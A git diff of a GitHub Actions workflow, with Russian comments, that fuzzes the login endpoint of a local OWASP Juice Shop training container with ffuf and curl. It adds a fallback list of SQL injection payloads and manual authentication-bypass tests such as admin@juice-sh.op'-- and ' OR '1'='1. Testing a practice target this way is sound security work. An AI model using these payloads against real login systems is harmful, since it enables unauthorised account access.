@@ -48,13 +48,55 @@ jobs:
           
       - name: Prepare payloads from local file
         run: |
-          echo "Using local SQL-Injection.txt file for payloads..."
+          echo "Looking for SQL-Injection.txt file..."
+          
+          # Ищем файл в разных местах
+          find . -name "SQL-Injection.txt" -type f 2>/dev/null || echo "File not found with find"
+          
+          # Проверяем наличие файла в разных возможных местах
+          if [ -f ".github/workflows/SQL-Injection.txt" ]; then
+            echo "Found SQL-Injection.txt in .github/workflows/"
+            SQL_FILE=".github/workflows/SQL-Injection.txt"
+          elif [ -f "SQL-Injection.txt" ]; then
+            echo "Found SQL-Injection.txt in root directory"
+            SQL_FILE="SQL-Injection.txt"
+          else
+            echo "SQL-Injection.txt not found, creating basic payloads"
+            SQL_FILE=""
+          fi
           
           # Создаем папку для payloads
           mkdir -p payloads
           
-          # Копируем существующий файл
-          cp SQL-Injection.txt payloads/base-payloads.txt
+          if [ -n "$SQL_FILE" ]; then
+            echo "Using existing file: $SQL_FILE"
+            cp "$SQL_FILE" payloads/base-payloads.txt
+            echo "Copied $(wc -l < payloads/base-payloads.txt) lines from $SQL_FILE"
+          else
+            # Создаем базовые payloads если файл не найден
+            echo "Creating basic SQL injection payloads..."
+            cat > payloads/base-payloads.txt << 'EOF'
+            '
+            ''
+            `
+            ``
+            "
+            ""
+            /
+            //
+            \
+            \\
+            ;
+            ' or "
+            -- 
+            # 
+            ' OR '1
+            ' OR 1 -- -
+            " OR "" = "
+            " OR 1 = 1 -- -
+            ' OR '' = '
+            EOF
+          fi
           
           # Добавляем специфичные payloads для SQLite (Juice Shop использует SQLite)
           cat > payloads/sqlite-specific.txt << 'EOF'
@@ -90,12 +132,12 @@ jobs:
           # Комбинируем файлы
           cat payloads/base-payloads.txt payloads/sqlite-specific.txt > payloads/all-payloads.txt
           
-          # Удаляем пустые строки и дубликаты
-          grep -v '^$' payloads/all-payloads.txt | sort -u > payloads/unique-payloads.txt
+          # Удаляем пустые строки и дубликаты, обрезаем пробелы
+          grep -v '^$' payloads/all-payloads.txt | sed 's/^[ \t]*//;s/[ \t]*$//' | sort -u > payloads/unique-payloads.txt
           
-          echo "Total unique payloads: $(wc -l < payloads/unique-payloads.txt)"
-          echo "First 10 payloads:"
-          head -10 payloads/unique-payloads.txt
+          echo "Total unique payloads prepared: $(wc -l < payloads/unique-payloads.txt)"
+          echo "First 5 payloads:"
+          head -5 payloads/unique-payloads.txt
           
       - name: Test login endpoint (baseline)
         run: |
@@ -120,18 +162,18 @@ jobs:
             -s -w "Status: %{http_code}\n" \
             -o /dev/null
           
-          # Фаззинг параметра email - ИЩЕМ ЛЮБЫЕ ОТЛИЧИЯ ОТ БАЗОВОГО ОТВЕТА
+          # Фаззинг параметра email
           echo -e "\n=== Fuzzing email parameter ==="
           ffuf -u http://localhost:3000/rest/user/login \
             -X POST \
             -H "Content-Type: application/json" \
             -d '{"email":"FUZZ","password":"password"}' \
             -w payloads/unique-payloads.txt \
-            -t 5 \
+            -t 10 \
             -p 0.1 \
             -o ffuf-results-email.json \
             -of json \
-            -mc 200,201,302,400,401,403,404,500 \
+            -mc all \
             -v 2>&1 | tee ffuf-output-email.txt
           
           # Фаззинг параметра password
@@ -141,112 +183,55 @@ jobs:
             -H "Content-Type: application/json" \
             -d '{"email":"admin@juice-sh.op","password":"FUZZ"}' \
             -w payloads/unique-payloads.txt \
-            -t 5 \
+            -t 10 \
             -p 0.1 \
             -o ffuf-results-password.json \
             -of json \
-            -mc 200,201,302,400,401,403,404,500 \
+            -mc all \
             -v 2>&1 | tee ffuf-output-password.txt
           
-      - name: Analyze results
+      - name: Simple results analysis
         run: |
-          echo "=== Analyzing fuzzing results ==="
+          echo "=== Simple analysis of fuzzing results ==="
           
-          # Устанавливаем jq для анализа JSON
-          sudo apt-get update && sudo apt-get install -y jq
-          
-          # Анализируем результаты для email
+          echo "1. Email parameter results:"
           if [ -f "ffuf-results-email.json" ]; then
-            echo "1. Analyzing email fuzzing results..."
-            
-            # Получаем базовый размер ответа (для невалидных учетных данных)
-            BASELINE_SIZE=$(stat -c%s baseline-response.txt 2>/dev/null || echo "0")
-            echo "Baseline response size: $BASELINE_SIZE bytes"
-            
-            # Ищем ответы, которые отличаются от базового
-            echo "Looking for responses with different size than baseline ($BASELINE_SIZE)..."
-            jq -r '.results[] | select(.length != '$BASELINE_SIZE' and .status != 500) | "Payload: \(.input.FUZZ), Status: \(.status), Size: \(.length), Words: \(.words), Lines: \(.lines)"' ffuf-results-email.json > interesting-results-email.txt 2>/dev/null || true
-            
-            if [ -s "interesting-results-email.txt" ]; then
-              echo -e "\nINTERESTING RESULTS FOUND IN EMAIL PARAMETER:"
-              cat interesting-results-email.txt
-              
-              # Сохраняем потенциально успешные payloads
-              jq -r '.results[] | select(.status != 401 and .status != 500) | .input.FUZZ' ffuf-results-email.json > potential-success-email.txt 2>/dev/null || true
-            else
-              echo "No interesting differences found in email parameter"
-            fi
+            echo "File exists, looking for non-401 responses..."
+            # Используем grep для простого анализа без jq
+            grep -o '"status":[0-9]*' ffuf-results-email.json | sort | uniq -c | sort -rn
+          else
+            echo "No ffuf-results-email.json file found"
           fi
           
-          # Анализируем результаты для password
+          echo -e "\n2. Password parameter results:"
           if [ -f "ffuf-results-password.json" ]; then
-            echo -e "\n2. Analyzing password fuzzing results..."
-            
-            jq -r '.results[] | select(.status != 401 and .status != 500) | "Payload: \(.input.FUZZ), Status: \(.status), Size: \(.length), Words: \(.words), Lines: \(.lines)"' ffuf-results-password.json > interesting-results-password.txt 2>/dev/null || true
-            
-            if [ -s "interesting-results-password.txt" ]; then
-              echo -e "\nINTERESTING RESULTS FOUND IN PASSWORD PARAMETER:"
-              cat interesting-results-password.txt
-            else
-              echo "No interesting differences found in password parameter"
-            fi
+            echo "File exists, looking for non-401 responses..."
+            grep -o '"status":[0-9]*' ffuf-results-password.json | sort | uniq -c | sort -rn
+          else
+            echo "No ffuf-results-password.json file found"
           fi
           
-      - name: Manual SQL injection tests
+      - name: Quick manual tests
         run: |
-          echo "=== Running targeted manual SQL injection tests ==="
+          echo "=== Quick manual SQL injection tests ==="
           
-          # Создаем файл для результатов ручных тестов
-          echo "Manual Test Results for Juice Shop SQL Injection" > manual-test-results.txt
-          echo "================================================" >> manual-test-results.txt
-          
-          # Тест 1: Классическая SQL инъекция (самая простая)
-          echo -e "\n1. Testing: ' OR '1'='1"
+          echo "1. Testing with: ' OR '1'='1"
           curl -X POST http://localhost:3000/rest/user/login \
             -H "Content-Type: application/json" \
-            -d '{"email":"'\'' OR '\''1'\''=''\''1","password":"anything"}' \
-            -s -w "Status: %{http_code}, Size: %{size_download}\n" \
-            -o test1-response.txt
-          echo "Test 1: ' OR '1'='1 -> $(tail -1 test1-response.txt)" >> manual-test-results.txt
+            -d "{\"email\":\"' OR '1'='1\",\"password\":\"anything\"}" \
+            -s -w "\nStatus: %{http_code}\n"
           
-          # Тест 2: Известный администратор Juice Shop с инъекцией
-          echo -e "\n2. Testing: admin@juice-sh.op'--"
+          echo -e "\n2. Testing with: admin@juice-sh.op'--"
           curl -X POST http://localhost:3000/rest/user/login \
             -H "Content-Type: application/json" \
             -d "{\"email\":\"admin@juice-sh.op'--\",\"password\":\"anything\"}" \
-            -s -w "Status: %{http_code}, Size: %{size_download}\n" \
-            -o test2-response.txt
-          echo "Test 2: admin@juice-sh.op'-- -> $(tail -1 test2-response.txt)" >> manual-test-results.txt
+            -s -w "\nStatus: %{http_code}\n"
           
-          # Тест 3: С кавычкой и комментарием
-          echo -e "\n3. Testing: admin@juice-sh.op' OR 1=1--"
+          echo -e "\n3. Testing with: admin@juice-sh.op' OR 1=1--"
           curl -X POST http://localhost:3000/rest/user/login \
             -H "Content-Type: application/json" \
             -d "{\"email\":\"admin@juice-sh.op' OR 1=1--\",\"password\":\"anything\"}" \
-            -s -w "Status: %{http_code}, Size: %{size_download}\n" \
-            -o test3-response.txt
-          echo "Test 3: admin@juice-sh.op' OR 1=1-- -> $(tail -1 test3-response.txt)" >> manual-test-results.txt
-          
-          # Тест 4: Без пароля, только инъекция в email
-          echo -e "\n4. Testing: anything' OR '1'='1"
-          curl -X POST http://localhost:3000/rest/user/login \
-            -H "Content-Type: application/json" \
-            -d "{\"email\":\"anything' OR '1'='1\",\"password\":\"\"}" \
-            -s -w "Status: %{http_code}, Size: %{size_download}\n" \
-            -o test4-response.txt
-          echo "Test 4: anything' OR '1'='1 -> $(tail -1 test4-response.txt)" >> manual-test-results.txt
-          
-          # Тест 5: Пробуем payload из вашего файла
-          echo -e "\n5. Testing: ' OR 'x'='x"
-          curl -X POST http://localhost:3000/rest/user/login \
-            -H "Content-Type: application/json" \
-            -d "{\"email\":\"' OR 'x'='x\",\"password\":\"anything\"}" \
-            -s -w "Status: %{http_code}, Size: %{size_download}\n" \
-            -o test5-response.txt
-          echo "Test 5: ' OR 'x'='x -> $(tail -1 test5-response.txt)" >> manual-test-results.txt
-          
-          echo -e "\n=== Manual Test Summary ==="
-          cat manual-test-results.txt
+            -s -w "\nStatus: %{http_code}\n"
           
       - name: Get Juice Shop logs
         if: always()
@@ -261,88 +246,47 @@ jobs:
           docker stop juice-shop 2>/dev/null || true
           docker rm juice-shop 2>/dev/null || true
           
-      - name: Upload fuzzing results as artifact
+      - name: Upload results
         uses: actions/upload-artifact@v4
         with:
-          name: sql-injection-results
+          name: fuzzing-results
           path: |
             ffuf-results-*.json
             ffuf-output-*.txt
-            interesting-results-*.txt
-            potential-success-email.txt
             baseline-response.txt
-            test*-response.txt
-            manual-test-results.txt
             juice-logs.log
             payloads/
           retention-days: 7
           
-      - name: Create summary report
+      - name: Create simple report
         if: always()
         run: |
-          echo "Creating summary report..."
+          echo "Creating simple report..."
           
-          # Считаем общее количество payloads
-          if [ -f "payloads/unique-payloads.txt" ]; then
-            total_payloads=$(wc -l < payloads/unique-payloads.txt)
-          else
-            total_payloads="Unknown"
-          fi
+          cat > report.md << 'EOF'
+          # SQL Injection Fuzzing Report
           
-          cat > summary-report.md << EOF
-          # SQL Injection Fuzzing Report - Juice Shop
-          
-          ## Test Details
+          ## Summary
           - Application: OWASP Juice Shop
-          - Target: /rest/user/login (POST)
+          - Target: /rest/user/login
           - Test Date: $(date)
-          - Total Payloads Tested: $total_payloads
           
-          ## Results Summary
+          ## Manual Test Results
+          Manual tests were executed with common SQL injection payloads.
+          
+          ## Next Steps
+          1. Check the uploaded artifacts for detailed results
+          2. Look for HTTP 200 or 302 responses
+          3. Try successful payloads manually
+          
+          ### Common Juice Shop SQL Injection Payloads:
+          - `admin@juice-sh.op'--`
+          - `' OR '1'='1`
+          - `admin@juice-sh.op' OR 1=1--`
           EOF
           
-          # Проверяем интересные результаты
-          if [ -f "interesting-results-email.txt" ] && [ -s "interesting-results-email.txt" ]; then
-            echo -e "\n## ⚠️ POTENTIAL SQL INJECTIONS FOUND IN EMAIL PARAMETER!" >> summary-report.md
-            echo "The following payloads produced different responses:" >> summary-report.md
-            echo '```' >> summary-report.md
-            cat interesting-results-email.txt >> summary-report.md
-            echo '```' >> summary-report.md
-          else
-            echo -e "\n## ✅ No unusual responses found in email parameter" >> summary-report.md
-          fi
-          
-          if [ -f "interesting-results-password.txt" ] && [ -s "interesting-results-password.txt" ]; then
-            echo -e "\n## ⚠️ POTENTIAL SQL INJECTIONS FOUND IN PASSWORD PARAMETER!" >> summary-report.md
-            echo "The following payloads produced different responses:" >> summary-report.md
-            echo '```' >> summary-report.md
-            cat interesting-results-password.txt >> summary-report.md
-            echo '```' >> summary-report.md
-          else
-            echo -e "\n## ✅ No unusual responses found in password parameter" >> summary-report.md
-          fi
-          
-          echo -e "\n## Manual Test Results" >> summary-report.md
-          if [ -f "manual-test-results.txt" ]; then
-            echo '```' >> summary-report.md
-            cat manual-test-results.txt >> summary-report.md
-            echo '```' >> summary-report.md
-          fi
-          
-          echo -e "\n## Analysis Notes" >> summary-report.md
-          echo "1. Juice Shop uses SQLite database" >> summary-report.md
-          echo "2. Standard login failure returns HTTP 401" >> summary-report.md
-          echo "3. Successful SQL injection would bypass authentication" >> summary-report.md
-          echo "4. Look for HTTP 200/302 responses or different response sizes" >> summary-report.md
-          
-          echo -e "\n## Next Steps" >> summary-report.md
-          echo "1. Review the full fuzzing results in the artifacts" >> summary-report.md
-          echo "2. Check for Set-Cookie headers in successful responses" >> summary-report.md
-          echo "3. Try the successful payloads in a browser manually" >> summary-report.md
-          echo "4. Check Juice Shop challenge completion" >> summary-report.md
-          
-      - name: Upload summary report
+      - name: Upload report
         uses: actions/upload-artifact@v4
         with:
-          name: summary-report
-          path: summary-report.md
+          name: report
+          path: report.md
